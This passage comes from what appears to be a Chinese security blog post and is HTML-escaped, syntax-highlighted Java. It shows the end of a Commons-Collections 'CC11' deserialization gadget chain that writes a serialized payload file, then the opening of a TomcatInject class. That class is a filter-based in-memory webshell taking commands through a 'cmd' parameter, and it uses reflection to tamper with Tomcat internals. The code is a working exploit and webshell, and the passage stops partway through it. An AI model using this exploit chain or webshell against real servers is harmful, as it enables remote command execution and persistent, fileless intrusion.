&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">keyField&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.util.MapEntry&amp;#34;&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;key&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">keyField&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">keyField&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">node&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">tiedmap&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 在 invoke 之后，
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">f3&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">transformer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;iMethodName&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f3&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f3&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformer&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;newTransformer&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectOutputStream&lt;/span> &lt;span style="color:#111">outputStream&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FileOutputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;./cc11Test4.ser&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">outputStream&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">writeObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">hashset&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">outputStream&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#00a8c8">catch&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">printStackTrace&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#75af00">getBytes&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">inputStream&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FileInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">File&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;E:\\JavaStudy\\test05\\target\\classes\\ccTest\\TomcatInject.class&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span> &lt;span style="color:#111">byteArrayOutputStream&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">inputStream&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">read&lt;/span>&lt;span style="color:#f92672">())!=-&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">byteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">write&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">bytes&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">byteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toByteArray&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">bytes&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>有了这个CC11的模板，剩下的就是注入内存马部分了，详细分析可以参见三梦师傅的&lt;a href="https://xz.aliyun.com/t/7388#toc-2">基于tomcat的内存 Webshell 无文件攻击技术&lt;/a>（太强了太强了），代码如下（有稍作修改）&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">ccTest&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.DOM&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.TransletException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xml.internal.dtm.DTMAxisIterator&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xml.internal.serializer.SerializationHandler&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.catalina.LifecycleState&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.catalina.core.ApplicationContext&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.catalina.core.StandardContext&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.IOException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Field&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Method&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Modifier&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.servlet.Filter&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.servlet.FilterChain&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.servlet.FilterConfig&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.servlet.ServletContext&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.servlet.ServletException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.servlet.ServletRequest&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.servlet.ServletResponse&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">TomcatInject&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">AbstractTranslet&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">Filter&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">cmdParamName&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;cmd&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">filterUrlPattern&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;/*&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">filterName&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;amiz&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 反射修改WRAP_SAME_OBJECT值为true
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;org.apache.catalina.core.ApplicationDispatcher&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">lang&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">reflect&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">Field&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;WRAP_SAME_OBJECT&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">lang&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">reflect&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">Field&lt;/span> &lt;span style="color:#111">modifiersField&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;modifiers&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 获取modifiers字段
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">modifiersField&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">//将变量设置为可访问
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">modifiersField&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setInt&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getModifiers&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#f92672">~&lt;/span>&lt;span style="color:#111">Modifier&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">FINAL&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 取消FINAL属性
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 将变量设置为可访问
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(!&lt;/span>&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getBoolean&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setBoolean&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 将变量设置为true
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 初始化lastServicedRequest
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;org.apache.catalina.core.ApplicationFilterChain&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;lastServicedRequest&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">modifiersField&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;modifiers&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">modifiersField&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">modifiersField&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setInt&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getModifiers&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#f92672">~&lt;/span>&lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">lang&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">reflect&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">Modifier&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">FINAL&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ThreadLocal&lt;/span>&lt;span style="color:#f92672">());&lt;/span> &lt;span style="color:#75715e">//设置ThreadLocal对象
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 初始化lastServicedResponse
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;lastServicedResponse&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">modifiersField&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;modifiers&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">modifiersField&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">modifiersField&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setInt&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getModifiers&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#f92672">~&lt;/span>&lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">lang&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">reflect&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">Modifier&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">FINAL&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
